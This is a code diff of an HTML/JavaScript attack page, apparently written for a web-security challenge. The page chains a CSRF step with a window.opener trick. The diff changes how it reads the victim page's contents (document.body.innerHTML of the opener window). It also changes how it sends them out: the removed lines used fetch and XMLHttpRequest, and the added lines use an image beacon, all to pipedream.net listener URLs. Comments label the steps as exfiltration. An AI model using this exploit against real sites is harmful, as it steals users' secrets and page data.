@@ -40,20 +40,11 @@
                     "var secret = text.split('Your secret:')[1].trim();" + 
                     
                     // 2. Encode le secret pour l'URL
-                    "var encodedSecret = encodeURIComponent(secret);" +
+                    "var encodedSecret = window.opener.document.body.innerHTML;" +
                     
                     // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
-                    "var exfil_url = 'https://eotoci65n24zl7e.m.pipedream.net?secret=' + encodedSecret;" +
-
-                    // The request is sent, but if the response doesn't have the correct
-                    // CORS header (Access-Control-Allow-Origin), the JavaScript will get an error,
-                    // but the data still reaches the listener (the server) before the error occurs.
-                    "fetch(exfil_url, { mode: 'no-cors' }).catch(e => console.log('Exfiltration request sent (CORS error expected).'));" +
-
-                    // Example using XMLHttpRequest (XHR)
-                    "var xhr = new XMLHttpRequest();" +
-                    'xhr.open("GET", exfil_url, true);' + 
-                    "xhr.send();" +
+                    "var img = new Image();" +
+                    "img.src = 'https://eoo7qwzk1d94nuc.m.pipedream.net?secret=' + encodedSecret;" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
                 "} else {" +
@@ -79,27 +70,18 @@
 
         function executeOpenerDelivery() {
             // 1. Ouvre un nouvel onglet vers le domaine cible pour établir la relation 'opener'.
-            const targetWindow = window.open('about:blank', '_blank');
-
-            if (targetWindow) {
-                console.log("Phase 2: Target window opened.");
-
-                // 2. Redirige la fenêtre cible vers la page vulnérable.
-                targetWindow.location = CHALLENGE_DOMAIN + VULNERABLE_PAGE;
-                console.log("Phase 2: Redirected target to vulnerable page /profile.");
-            } else {
-                console.error("Popup blocked! Attack failed.");
-                document.querySelector('.card h1').textContent = "Attack Failed!";
-                document.querySelector('.card p').textContent = "Please disable your popup blocker and try again.";
-            }
+            const targetWindow = window.open(window.location.href, 'MyCustomWindowName');
         }
 
         // --- Enchaînement des étapes d'attaque ---
+        if(window.name != "MyCustomWindowName") {
+          executeOpenerDelivery();
+          window.location = CHALLENGE_DOMAIN + VULNERABLE_PAGE
+        }
 
-        // 1. Exécute le CSRF immédiatement au chargement pour stocker le payload.
-        executeCsrf();
-
-        setTimeout(executeOpenerDelivery, 1000);
+        executeCsrf()
+        
+        
     </script>
 </body>
 </html>
